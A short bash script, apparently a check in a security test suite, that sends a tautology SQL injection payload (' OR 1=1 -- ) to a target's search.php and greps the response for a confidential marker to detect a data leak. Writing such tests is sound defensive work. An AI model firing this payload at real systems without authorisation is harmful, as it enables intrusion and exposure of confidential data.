#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "q=' OR 1=1 -- " "$TARGET/search.php" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
